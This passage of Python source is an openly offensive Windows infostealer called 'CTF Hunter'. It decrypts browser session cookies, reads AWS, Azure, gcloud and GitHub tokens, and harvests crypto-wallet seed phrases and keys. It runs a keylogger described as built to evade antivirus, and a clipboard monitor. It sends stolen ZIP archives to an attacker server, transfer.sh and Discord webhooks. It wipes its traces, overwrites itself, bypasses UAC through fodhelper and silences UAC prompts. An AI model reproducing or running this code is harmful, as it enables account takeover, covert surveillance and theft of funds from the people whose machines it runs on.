                        dt = datetime.datetime.fromtimestamp(ts/1e6).strftime("%Y-%m-%d %H:%M:%S") if ts else ""
                    except: dt = str(ts)
                    out.append(f"  {dt}  [{count}x]  {url}  {title}")
                    csv_lines.append(f'Firefox,{profile.name},"{url}","{title}",{dt},{count}')
            except Exception as e:
                out.append(f"  [error: {e}]")
            finally: close_sqlite(conn)

    text = "\n".join(out)
    log(_ads("bh"), text)
    log(_ads("bc"), "\n".join(csv_lines))
    return text


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 3 — SESSION COOKIES & TOKENS
# ══════════════════════════════════════════════════════════════════════════════
# Session-relevant cookie names
SESSION_NAMES = re.compile(
    r'(?i)(session|sessionid|sid|ssid|hsid|apisid|sapisid|auth|token|'
    r'access_token|refresh_token|oauth|bearer|connect\.sid|__cf|cf_clearance|'
    r'PHPSESSID|JSESSIONID|ASP\.NET_SessionId|laravel_session|_rails|csrf)', re.I)

def collect_sessions() -> str:
    out = [banner("SESSION COOKIES & OAUTH TOKENS")]

    # ── Chromium cookies ──────────────────────────────────────────────────────
    for path, name in CHROMIUM_PROFILES:
        ud = expand(path)
        if not ud.exists(): continue
        mkey = chrome_master_key(ud)
        for profile in _chromium_profile_dirs(ud):
            db_path = profile / "Cookies"
            if not db_path.exists(): continue
            conn = open_sqlite(db_path)
            if not conn: continue
            out.append(sep(f"{name} — {profile.name} Cookies"))
            try:
                for host, name_, val, enc_val, path_, secure, http_only, exp in conn.execute(
                        "SELECT host_key, name, value, encrypted_value, path, is_secure, is_httponly, expires_utc FROM cookies"):
                    if not SESSION_NAMES.search(str(name_)): continue
                    decrypted = val or chrome_decrypt(bytes(enc_val) if enc_val else b"", mkey)
                    out.append(f"  Host     : {host}")
                    out.append(f"  Name     : {name_}")
                    out.append(f"  Value    : {decrypted}")
                    out.append(f"  Path     : {path_}  Secure={secure}  HttpOnly={http_only}\n")
            except Exception as e:
                out.append(f"  [error: {e}]")
            finally: close_sqlite(conn)

        # Local State — contains encrypted_key and device/session metadata
        ls_path = ud / "Local State"
        if ls_path.exists():
            out.append(sep(f"{name} Local State"))
            try:
                ls = json.loads(ls_path.read_text(encoding="utf-8"))
                # Pull interesting fields without flooding
                for key in ["os_crypt", "profile", "user_experience_metrics",
                            "device_id", "signin", "account_info"]:
                    if key in ls:
                        out.append(f"  {key}: {json.dumps(ls[key], indent=2)[:800]}")
            except Exception as e:
                out.append(f"  [error: {e}]")

    # ── Firefox cookies ────────────────────────────────────────────────────────
    ff_root = expand(r"%APPDATA%\Mozilla\Firefox\Profiles")
    if ff_root.exists():
        for profile in ff_root.iterdir():
            db_path = profile / "cookies.sqlite"
            if not db_path.exists(): continue
            conn = open_sqlite(db_path)
            if not conn: continue
            out.append(sep(f"Firefox — {profile.name} Cookies"))
            try:
                for host, name_, val, path_, secure, http_only in conn.execute(
                        "SELECT host, name, value, path, isSecure, isHttpOnly FROM moz_cookies"):
                    if not SESSION_NAMES.search(str(name_)): continue
                    out.append(f"  Host={host}  Name={name_}  Value={val}  "
                               f"Path={path_}  Secure={secure}  HttpOnly={http_only}")
            except Exception as e:
                out.append(f"  [error: {e}]")
            finally: close_sqlite(conn)

        # key4.db and logins.json (NSS key material)
        for profile in ff_root.iterdir():
            for fname in ["key4.db", "logins.json", "cert9.db"]:
                p = profile / fname
                if p.exists():
                    out.append(f"  [Firefox NSS material] {p}  ({p.stat().st_size} bytes)")

    # ── Browser fingerprint data ──────────────────────────────────────────────
    out.append(sep("Browser Fingerprint Material"))
    for path, name in CHROMIUM_PROFILES:
        ud = expand(path)
        if not ud.exists(): continue
        for profile in _chromium_profile_dirs(ud):
            # Preferences — contains UA, extensions, account info
            prefs_path = profile / "Preferences"
            if prefs_path.exists():
                try:
                    prefs = json.loads(prefs_path.read_text(encoding="utf-8"))
                    acc   = prefs.get("account_info", prefs.get("profile",{}).get("gaia_info_picture_url",""))
                    ua    = prefs.get("webkit",{}).get("webprefs",{})
                    name_ = prefs.get("profile",{}).get("name","")
                    email = prefs.get("profile",{}).get("email_address","") or \
                            str(prefs.get("account_info",""))[:200]
                    out.append(f"  [{name}/{profile.name}]  ProfileName={name_}  Email={email}")
                except: pass

            # Installed extensions
            ext_dir = profile / "Extensions"
            if ext_dir.exists():
                exts = [d.name for d in ext_dir.iterdir() if d.is_dir()]
                out.append(f"  [{name}/{profile.name}] Extensions: {', '.join(exts[:20])}")

    # ── System identity ────────────────────────────────────────────────────────
    out.append(sep("System Identity"))
    out.append(f"  Hostname : {socket.gethostname()}")
    out.append(f"  User     : {os.environ.get('USERNAME','')}")
    out.append(f"  Domain   : {os.environ.get('USERDOMAIN','')}")
    out.append(f"  OS       : {platform.version()}")
    out.append(f"  Arch     : {platform.machine()}")

    # ── OAuth / token files ───────────────────────────────────────────────────
    out.append(sep("OAuth Token Files"))
    token_paths = [
        r"%USERPROFILE%\.azure\accessTokens.json",
        r"%APPDATA%\gcloud\application_default_credentials.json",
        r"%USERPROFILE%\.aws\credentials",
        r"%APPDATA%\GitHub CLI\hosts.yml",
    ]
    for p in token_paths:
        content = safe_read(expand(p))
        if content:
            out.append(f"  [{p}]\n{content[:600]}")

    text = "\n".join(out)
    log(_ads("ss"), text)
    return text


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 4 — CRYPTO WALLET SEEDS & KEYS
# ══════════════════════════════════════════════════════════════════════════════
SEED_RE = re.compile(r'(?<![a-z])([a-z]{3,8}(?:[ \t][a-z]{3,8}){11,23})(?![a-z])')

def _check_seeds(text, location, out):
    for m in SEED_RE.finditer(text):
        words = m.group(0).split()
        if len(words) in (12,15,18,21,24):
            out.append(f"  [SEED PHRASE {len(words)}w] {location}\n  {m.group(0)}\n")

def collect_wallets() -> str:
    out = [banner("CRYPTO WALLETS & SEED PHRASES")]

    wallet_locations = [
        (r"%APPDATA%\Bitcoin\wallet.dat",             "Bitcoin Core"),
        (r"%APPDATA%\Bitcoin\wallets",                "Bitcoin Core (dir)"),
        (r"%APPDATA%\Ethereum\keystore",              "Ethereum Geth"),
        (r"%USERPROFILE%\.ethereum\keystore",         "Ethereum"),
        (r"%APPDATA%\Electrum\wallets",               "Electrum"),
        (r"%APPDATA%\Exodus",                         "Exodus"),
        (r"%APPDATA%\atomic\Local Storage\leveldb",   "Atomic Wallet"),
        (r"%APPDATA%\Monero\wallets",                 "Monero"),
        (r"%APPDATA%\bitmonero",                      "Monero daemon"),
        (r"%APPDATA%\Litecoin\wallet.dat",            "Litecoin"),
        (r"%APPDATA%\Dogecoin\wallet.dat",            "Dogecoin"),
        (r"%APPDATA%\Wasabi Wallet\WalletBackups",    "Wasabi"),
        (r"%APPDATA%\Sparrow\wallets",                "Sparrow"),
        # Browser wallet extensions (Chrome / Edge / Brave / Firefox profiles)
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
         "MetaMask Chrome"),
        (r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
         "MetaMask Edge"),
        (r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
         "MetaMask Brave"),
        (r"%APPDATA%\Mozilla\Firefox\Profiles",
         "MetaMask Firefox (scan profiles for webextensions-store-metamask)"),
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa",
         "Phantom Chrome (Solana)"),
        (r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa",
         "Phantom Edge (Solana)"),
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad",
         "Coinbase Wallet Chrome"),
        (r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad",
         "Coinbase Wallet Edge"),
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\fhbohimaelbohpjbbldcngcnapndodjp",
         "Binance Chain Wallet Chrome"),
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\dmkamcknogkgcdfhhbddcghachkejeap",
         "Keplr Wallet Chrome (Cosmos)"),
        (r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\agoakfejjabomempkjlepdflaleeobhb",
         "OKX Wallet Chrome"),
        # Desktop wallet apps
        (r"%APPDATA%\Ledger Live",                "Ledger Live"),
        (r"%APPDATA%\Trezor Suite",               "Trezor Suite"),
        (r"%APPDATA%\Zcash\wallet.dat",           "Zcash"),
        (r"%APPDATA%\DashCore\wallet.dat",         "Dash"),
        (r"%APPDATA%\Binance",                    "Binance Desktop"),
        (r"%USERPROFILE%\AppData\Local\Programs\Ledger Live",  "Ledger Live (alt)"),
    ]

    for path, label in wallet_locations:
        p = expand(path)
        if p.is_file():
            out.append(f"  [{label}] {p}  ({p.stat().st_size:,} bytes)")
            raw = safe_bytes(p, 64*1024)
            if raw:
                text = raw.decode("latin-1", errors="replace")
                _check_seeds(text, f"{label}: {p}", out)
                for s in printable_strings(raw):
                    if re.match(r'^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$', s):
                        out.append(f"  [WIF KEY] {s}")
                    elif re.match(r'^xprv[1-9A-HJ-NP-Za-km-z]{107}$', s):
                        out.append(f"  [XPRV] {s}")
                    elif re.match(r'^[0-9a-fA-F]{64}$', s):
                        out.append(f"  [HEX KEY?] {s}")
                    elif '"seed"' in s.lower() or '"mnemonic"' in s.lower():
                        out.append(f"  [SEED JSON] {s}")
        elif p.is_dir():
            for child in p.rglob("*"):
                try:
                    if not child.is_file() or child.stat().st_size > 5*1024*1024: continue
                    out.append(f"  [{label}] {child}  ({child.stat().st_size:,} bytes)")
                    raw = safe_bytes(child, 64*1024)
                    if not raw: continue
                    text = raw.decode("latin-1", errors="replace")
                    _check_seeds(text, f"{label}: {child}", out)
                    # Electrum seed in JSON
                    for m in re.finditer(r'"seed"\s*:\s*"([^"]+)"', text):
                        out.append(f"  [ELECTRUM SEED] {m.group(1)}")
                    # ETH keystore
                    if '"ciphertext"' in text:
                        out.append(f"  [ETH KEYSTORE JSON]\n{text[:500]}")
                    for s in printable_strings(raw):
                        if re.match(r'^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$', s):
                            out.append(f"  [WIF KEY] {s}")
                        elif re.match(r'^xprv[1-9A-HJ-NP-Za-km-z]{107}$', s):
                            out.append(f"  [XPRV] {s}")
                except: continue

    # Broad wallet.dat search
    for root in [expand(r"%USERPROFILE%")]:
        try:
            for p in root.rglob("wallet.dat"):
                out.append(f"  [wallet.dat] {p}  ({p.stat().st_size:,} bytes)")
        except: pass

    text = "\n".join(out)
    log(_ads("wl"), text)
    return text


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 5 — KEYLOGGER + CLIPBOARD MONITOR (background threads)
#
#  Three keylogger backends, tried in order of stealth:
#
#  1. Raw Input API  — registers a hidden message-only window for WM_INPUT.
#                      No hook installed anywhere. Indistinguishable from a
#                      game engine reading controller/keyboard input. Lowest
#                      AV detection of the three.
#
#  2. pynput         — uses SetWindowsHookEx(WH_KEYBOARD_LL). Detected by
#                      Windows Defender behavioural analysis and most EDRs.
#                      Used only if Raw Input fails to initialise.
#
#  3. GetAsyncKeyState poll — polls 0x01-0xFE at 50 Hz. No hook, but the
#                      polling pattern itself can be flagged. Used only if
#                      both previous methods fail.
# ══════════════════════════════════════════════════════════════════════════════
_current_window  = ""
_key_buffer      = []
_key_lock        = threading.Lock()

def _get_window_title():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        buf  = ctypes.create_unicode_buffer(512)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, 512)
        return buf.value
    except: return ""

def _flush_buffer():
    global _current_window
    with _key_lock:
        if not _key_buffer: return
        day_stream = _ads(f"kl{datetime.now():%m%d}")
        with open(day_stream, "a", encoding="utf-8") as f:
            f.write(f"\n[{now()}] [{_current_window}]\n")
            f.write("".join(_key_buffer) + "\n")
        _key_buffer.clear()

def _append_key(char: str):
    global _current_window
    win = _get_window_title()
    if win != _current_window:
        _flush_buffer()
        _current_window = win
    with _key_lock:
        _key_buffer.append(char)
    if char in ("\n", "\r"):
        _flush_buffer()


# ── VK code → printable character map (used by Raw Input + AsyncKeyState) ────
_VK_PRINTABLE = {
    0x08: "[BS]", 0x09: "[Tab]", 0x0D: "\n", 0x1B: "[Esc]",
    0x20: " ",    0x2E: "[Del]",
    0x30:"0",0x31:"1",0x32:"2",0x33:"3",0x34:"4",
    0x35:"5",0x36:"6",0x37:"7",0x38:"8",0x39:"9",
    **{0x41+i: chr(0x61+i) for i in range(26)},   # a-z (lowercase)
    0xBA:";"  ,0xBB:"=" ,0xBC:"," ,0xBD:"-" ,0xBE:"." ,0xBF:"/" ,0xC0:"`",
    0xDB:"["  ,0xDC:"\\",0xDD:"]" ,0xDE:"'" ,
    **{0x60+i: str(i) for i in range(10)},          # numpad 0-9
}


# ── Backend 1: Raw Input API ──────────────────────────────────────────────────
def _start_raw_input():
    """
    Register a hidden message-only window for WM_INPUT (raw keyboard).
    No SetWindowsHookEx call at all — identical pattern to a game engine.
    """
    import ctypes.wintypes as wt

    # Structures
    class RAWINPUTDEVICE(ctypes.Structure):
        _fields_ = [("usUsagePage", wt.USHORT),
                    ("usUsage",     wt.USHORT),
                    ("dwFlags",     wt.DWORD),
                    ("hwndTarget",  wt.HWND)]

    class RAWINPUTHEADER(ctypes.Structure):
        _fields_ = [("dwType",  wt.DWORD),
                    ("dwSize",  wt.DWORD),
                    ("hDevice", wt.HANDLE),
                    ("wParam",  wt.WPARAM)]

    class RAWKEYBOARD(ctypes.Structure):
        _fields_ = [("MakeCode",         wt.USHORT),
                    ("Flags",            wt.USHORT),
                    ("Reserved",         wt.USHORT),
                    ("VKey",             wt.USHORT),
                    ("Message",          wt.UINT),
                    ("ExtraInformation", wt.ULONG)]

    class RAWINPUT(ctypes.Structure):
        class _data(ctypes.Union):
            class _keyboard(ctypes.Structure):
                _fields_ = [("header",   RAWINPUTHEADER),
                            ("keyboard", RAWKEYBOARD)]
            _fields_ = [("keyboard", _keyboard)]
        _fields_ = [("header", RAWINPUTHEADER), ("data", _data)]

    WM_INPUT      = 0x00FF
    RIM_TYPEKEYBOARD = 1
    RI_KEY_BREAK  = 0x01    # key-up flag — ignore these
    HWND_MESSAGE  = ctypes.cast(ctypes.c_void_p(-3), wt.HWND)

    u32 = ctypes.windll.user32
    k32 = ctypes.windll.kernel32

    # Create a message-only window (invisible, no taskbar entry)
    wc = ctypes.create_unicode_buffer("RawInput_CTF")
    atom = u32.RegisterClassExW(ctypes.byref(
        type("WNDCLASSEX", (ctypes.Structure,), {
            "_fields_": [("cbSize",wt.UINT),("style",wt.UINT),
                         ("lpfnWndProc",ctypes.c_void_p),("cbClsExtra",wt.INT),
                         ("cbWndExtra",wt.INT),("hInstance",wt.HANDLE),
                         ("hIcon",wt.HANDLE),("hCursor",wt.HANDLE),
                         ("hbrBackground",wt.HANDLE),("lpszMenuName",wt.LPCWSTR),
                         ("lpszClassName",wt.LPCWSTR),("hIconSm",wt.HANDLE)]
        })(cbSize=ctypes.sizeof(type("WNDCLASSEX",(ctypes.Structure,),
           {"_fields_":[("cbSize",wt.UINT),("style",wt.UINT),
                        ("lpfnWndProc",ctypes.c_void_p),("cbClsExtra",wt.INT),
                        ("cbWndExtra",wt.INT),("hInstance",wt.HANDLE),
                        ("hIcon",wt.HANDLE),("hCursor",wt.HANDLE),
                        ("hbrBackground",wt.HANDLE),("lpszMenuName",wt.LPCWSTR),
                        ("lpszClassName",wt.LPCWSTR),("hIconSm",wt.HANDLE)]})),
          lpfnWndProc=u32.DefWindowProcW,
          hInstance=k32.GetModuleHandleW(None),
          lpszClassName="RawInput_CTF")
    ))
    if not atom:
        return False

    hwnd = u32.CreateWindowExW(0,"RawInput_CTF","",0,0,0,0,0,
                               HWND_MESSAGE, None,
                               k32.GetModuleHandleW(None), None)
    if not hwnd:
        return False

    # Register for raw keyboard input
    rid = RAWINPUTDEVICE(0x01, 0x06, 0x00, hwnd)   # HID_USAGE_PAGE_GENERIC, HID_USAGE_GENERIC_KEYBOARD
    if not u32.RegisterRawInputDevices(ctypes.byref(rid),
                                       1, ctypes.sizeof(rid)):
        return False

    def _pump():
        msg = ctypes.create_string_buffer(48)   # MSG struct
        while u32.GetMessageW(ctypes.cast(msg, ctypes.c_void_p), hwnd, 0, 0) > 0:
            # Check for WM_INPUT
            msg_id = ctypes.c_uint.from_buffer_copy(msg, 4).value
            if msg_id == WM_INPUT:
                sz = wt.UINT(0)
                lparam = ctypes.c_void_p.from_buffer_copy(msg, 32).value
                u32.GetRawInputData(lparam, 0x10000003,  # RID_INPUT
                                    None, ctypes.byref(sz), ctypes.sizeof(RAWINPUTHEADER))
                buf = ctypes.create_string_buffer(sz.value)
                if u32.GetRawInputData(lparam, 0x10000003,
                                       buf, ctypes.byref(sz),
                                       ctypes.sizeof(RAWINPUTHEADER)) > 0:
                    ri = RAWINPUT.from_buffer_copy(buf)
                    kb = ri.data.keyboard.keyboard
                    if kb.Flags & RI_KEY_BREAK:
                        continue    # key-up — skip
                    vk = kb.VKey
                    char = _VK_PRINTABLE.get(vk, f"[{vk:#04x}]")
                    _append_key(char)
            u32.TranslateMessage(ctypes.cast(msg, ctypes.c_void_p))
            u32.DispatchMessageW(ctypes.cast(msg, ctypes.c_void_p))

    t = threading.Thread(target=_pump, daemon=True)
    t.start()
    return t


# ── Backend 2: pynput (SetWindowsHookEx — higher AV risk) ────────────────────
def _start_pynput():
    try:
        from pynput import keyboard
    except ImportError:
        return None

    def on_press(key):
        try:    char = key.char or ""
        except: char = f"[{str(key).replace('Key.','')}]"
        _append_key(char)

    def _run():
        with keyboard.Listener(on_press=on_press) as l:
            l.join()

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return t


# ── Backend 3: GetAsyncKeyState polling (no hook, but polling is detectable) ─
def _start_async_poll(interval: float = 0.02):
    GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
    _prev = [0] * 256

    def _poll():
        while True:
            for vk in range(0x08, 0xFE):
                state = GetAsyncKeyState(vk)
                # bit 0 = pressed since last call; bit 15 = currently down
                if state & 0x0001:
                    char = _VK_PRINTABLE.get(vk, f"[{vk:#04x}]")
                    _append_key(char)
            time.sleep(interval)

    t = threading.Thread(target=_poll, daemon=True)
    t.start()
    return t


def start_keylogger():
    """Try Raw Input → pynput → GetAsyncKeyState poll, in order of stealth."""
    t = _start_raw_input()
    if t:
        print(f"[+] Keylogger (Raw Input) running → {ADS_HOST}:kl{{MMDD}}")
        return t
    t = _start_pynput()
    if t:
        print(f"[+] Keylogger (pynput/hook) running → {ADS_HOST}:kl{{MMDD}}")
        return t
    t = _start_async_poll()
    print(f"[+] Keylogger (AsyncKeyState poll) running → {ADS_HOST}:kl{{MMDD}}")
    return t


def start_clipboard_monitor(interval=3):
    """Polls clipboard every `interval` seconds, appends new content to ADS stream."""
    clip_stream = _ads("cl")
    last = ""

    def _run():
        nonlocal last
        OpenClipboard    = ctypes.windll.user32.OpenClipboard
        CloseClipboard   = ctypes.windll.user32.CloseClipboard
        GetClipboardData = ctypes.windll.user32.GetClipboardData
        CF_UNICODETEXT   = 13
        while True:
            try:
                OpenClipboard(None)
                handle = GetClipboardData(CF_UNICODETEXT)
                CloseClipboard()
                if handle:
                    text = ctypes.cast(handle, ctypes.c_wchar_p).value or ""
                    if text and text != last:
                        last = text
                        with open(clip_stream, "a", encoding="utf-8") as f:
                            f.write(f"\n[{now()}]\n{text}\n")
            except: pass
            time.sleep(interval)

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    print(f"[+] Clipboard monitor running → {clip_stream}")
    return t


# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 6 — EXFILTRATION
# ══════════════════════════════════════════════════════════════════════════════

def _build_zip() -> bytes:
    """Read every ADS stream into memory and return a compressed ZIP as bytes."""
    import zipfile, io
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for stream, filename in ADS_STREAMS.items():
            try:
                with open(_ads(stream), "r", encoding="utf-8", errors="replace") as f:
                    data = f.read()
                if data.strip():
                    zf.writestr(filename, data)
            except FileNotFoundError:
                pass

        # Keylogger streams are dynamic — probe last 30 days
        for days_ago in range(30):
            d = datetime.now() - timedelta(days=days_ago)
            try:
                with open(_ads(f"kl{d:%m%d}"), "r", encoding="utf-8", errors="replace") as f:
                    data = f.read()
                if data.strip():
                    zf.writestr(f"keylog_{d:%Y-%m-%d}.txt", data)
            except FileNotFoundError:
                pass

    return buf.getvalue()


def _host_id() -> str:
    return f"{os.environ.get('COMPUTERNAME', socket.gethostname())}_{os.environ.get('USERNAME', '')}"


def exfiltrate(url: str, cleanup: bool = True):
    """Direct ZIP POST to your own receiver (receive.py)."""
    import urllib.request
    payload = _build_zip()
    success = False
    try:
        req = urllib.request.Request(url, data=payload,
            headers={"Content-Type": "application/zip",
                     "X-Host": _host_id(), "X-Time": now()},
            method="POST")
        with urllib.request.urlopen(req, timeout=15) as r:
            print(f"[+] Exfil direct → {url}  HTTP {r.status}")
            success = r.status == 200
    except Exception as e:
        print(f"[!] Exfil direct failed: {e}")
    if cleanup and success:
        _wipe_traces()


def exfil_transfer_sh(notify_url: str = "", cleanup: bool = True):
    """Upload ZIP to transfer.sh (HTTPS to CDN), optionally POST the download URL to notify_url."""
    import urllib.request, urllib.parse
    payload  = _build_zip()
    hostname = _host_id()
    filename = urllib.parse.quote(f"{hostname}.zip")
    dl_url   = ""
    success  = False
    try:
        req = urllib.request.Request(
            f"https://transfer.sh/{filename}",
            data=payload,
            headers={"Content-Type": "application/zip", "Max-Days": "3"},
            method="PUT")
        with urllib.request.urlopen(req, timeout=60) as r:
            dl_url = r.read().decode().strip()
        print(f"[+] Uploaded → {dl_url}")
        success = bool(dl_url)
    except Exception as e:
        print(f"[!] transfer.sh upload failed: {e}")

    # Optionally notify your server with just the tiny download URL
    if dl_url and notify_url:
        try:
            note = f"{hostname} | {now()} | {dl_url}".encode()
            req2 = urllib.request.Request(notify_url, data=note,
                headers={"Content-Type": "text/plain", "X-Host": hostname},
                method="POST")
            with urllib.request.urlopen(req2, timeout=10) as r:
                print(f"[+] Notify → {notify_url}  HTTP {r.status}")
        except Exception as e:
            print(f"[!] Notify failed: {e}  (download URL: {dl_url})")

    if cleanup and success:
        _wipe_traces()


def exfil_discord(webhook_url: str, cleanup: bool = True):
    """Attach the ZIP directly to a Discord webhook message (max ~25 MB)."""
    import urllib.request
    payload  = _build_zip()
    hostname = _host_id()

    # Discord file size limit is 25 MB; fall back to transfer.sh + URL message if exceeded
    DISCORD_LIMIT = 24 * 1024 * 1024
    if len(payload) > DISCORD_LIMIT:
        print(f"[!] ZIP ({len(payload)//1024} KB) exceeds Discord limit — uploading to transfer.sh instead")
        _exfil_discord_url(webhook_url, hostname, payload)
        return

    boundary = b"ctfhunter7F3A2B9C"
    body = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="content"\r\n\r\n'
        + f"\U0001f512 **{hostname}** | {now()} | {len(payload)//1024} KB".encode() + b"\r\n"
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="results.zip"\r\n'
        b"Content-Type: application/zip\r\n\r\n"
        + payload + b"\r\n"
        b"--" + boundary + b"--\r\n"
    )
    success = False
    try:
        req = urllib.request.Request(webhook_url, data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"},
            method="POST")
        with urllib.request.urlopen(req, timeout=30) as r:
            # Discord returns 200 or 204 on success
            print(f"[+] Exfil Discord → webhook  HTTP {r.status}")
            success = r.status in (200, 204)
    except Exception as e:
        print(f"[!] Discord exfil failed: {e}")

    if cleanup and success:
        _wipe_traces()


def _exfil_discord_url(webhook_url: str, hostname: str, payload: bytes):
    """Fallback: upload to transfer.sh and post just the URL to Discord."""
    import urllib.request, urllib.parse
    dl_url = ""
    try:
        filename = urllib.parse.quote(f"{hostname}.zip")
        req = urllib.request.Request(
            f"https://transfer.sh/{filename}", data=payload,
            headers={"Content-Type": "application/zip", "Max-Days": "3"},
            method="PUT")
        with urllib.request.urlopen(req, timeout=60) as r:
            dl_url = r.read().decode().strip()
    except Exception as e:
        print(f"[!] Fallback transfer.sh upload failed: {e}")
        return

    # Post just the URL as a plain Discord message (no attachment)
    import json
    msg = json.dumps({"content": f"\U0001f512 **{hostname}** | {now()}\n{dl_url}"}).encode()
    try:
        req2 = urllib.request.Request(webhook_url, data=msg,
            headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(req2, timeout=15) as r:
            print(f"[+] Discord URL notify → {r.status}  | download: {dl_url}")
    except Exception as e:
        print(f"[!] Discord notify failed: {e}  | download: {dl_url}")


def _wipe_traces():
    """Remove ADS host file (drops all streams atomically) and clear PS history."""
    # Deleting the host file removes every attached ADS stream in one operation
    try:
        ADS_HOST.unlink(missing_ok=True)
    except Exception:
        pass

    # Clear PowerShell ConsoleHost history
    ps_hist = Path(os.environ.get("APPDATA", "")) \
              / "Microsoft" / "Windows" / "PowerShell" / "PSReadLine" / "ConsoleHost_history.txt"
    try:
        if ps_hist.exists():
            ps_hist.write_text("")  # truncate rather than delete (delete leaves MFT entry)
    except Exception:
        pass

    # Overwrite the script itself if running from temp/USB copy location
    try:
        script = Path(sys.argv[0]).resolve()
        if "INetCache" in str(script) or "Temp" in str(script):
            script.write_bytes(os.urandom(len(script.read_bytes())))
            script.unlink()
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  PRIVILEGE ELEVATION — UAC bypass via fodhelper.exe
#  fodhelper reads HKCU\Software\Classes\ms-settings\shell\open\command before
#  auto-elevating — a user-writable key, so no admin rights needed to set it.
#  This only works when the current account is a local Admin running without an
#  elevated token (the standard post-login state).  Not a security boundary.
# ══════════════════════════════════════════════════════════════════════════════

def is_admin() -> bool:
    """Return True if this process already has an elevated (admin) token."""
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def elevate_fodhelper(extra_args: list[str] | None = None) -> bool:
    """
    Attempt a UAC bypass via fodhelper.exe using the ms-settings registry trick.

    Steps:
      1. Write the re-launch command to
         HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command (default)
         and set DelegateExecute = "" (empty string, signals auto-elevation).
      2. Launch fodhelper.exe — Windows auto-elevates it, which in turn
         executes our command as a high-integrity process.
      3. Clean up the registry key regardless of outcome.

    Returns True if the bypass was launched (the *new* process is elevated;
    the current process remains unelevated and should exit).
    Returns False if already admin or if the bypass failed.
    """
    if is_admin():
        return False   # nothing to do

    import winreg

    # Rebuild argv: same script, same interpreter, drop --elevate, keep rest
    interp = sys.executable
    script  = os.path.abspath(sys.argv[0])
    args    = [a for a in (extra_args or sys.argv[1:]) if a != "--elevate"]
    # Build a quoted command string safe for the registry value
    cmd_parts = [f'"{interp}"', f'"{script}"'] + args
    cmd       = " ".join(cmd_parts)

    key_path = r"Software\Classes\ms-settings\shell\open\command"
    try:
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path,
                                 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "",               0, winreg.REG_SZ, cmd)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        # Trigger the auto-elevation — fodhelper reads the registry, elevates,
        # then runs our command in a new high-integrity process.
        subprocess.Popen(
            ["fodhelper.exe"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        time.sleep(2)   # give fodhelper time to read the key before cleanup
        return True

    except Exception as e:
        print(f"[!] fodhelper bypass failed: {e}")
        return False

    finally:
        # Always clean the key — leave no trace
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except Exception:
            pass


def disable_uac_prompt() -> bool:
    """
    Set ConsentPromptBehaviorAdmin = 0 so all future UAC elevations are silent.
    Requires an already-elevated (admin) token — call this after --elevate.
    Returns True on success, False if not admin or write failed.
    """
    if not is_admin():
        return False
    import winreg
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    ap = argparse.ArgumentParser(description="CTF Hunter — credential + session extractor")
    ap.add_argument("--exfil",    metavar="URL",     help="Direct ZIP POST to http://IP:PORT (receive.py)")
    ap.add_argument("--transfer", metavar="NOTIFY",  nargs="?", const="",
                                                     help="Upload to transfer.sh; optionally POST the download URL to NOTIFY")
    ap.add_argument("--discord",  metavar="WEBHOOK", help="Send ZIP as Discord webhook attachment")
    ap.add_argument("--monitor",  action="store_true", help="Start keylogger + clipboard monitor")
    ap.add_argument("--all",      action="store_true", help="Run everything including monitor")
    ap.add_argument("--elevate",  action="store_true", help="UAC bypass via fodhelper; re-runs script elevated")
    args = ap.parse_args()

    # ── Elevation ───────────────────────────────────────────────────────────
    if args.elevate:
        if is_admin():
            print("[*] Already running as administrator — skipping UAC bypass")
        else:
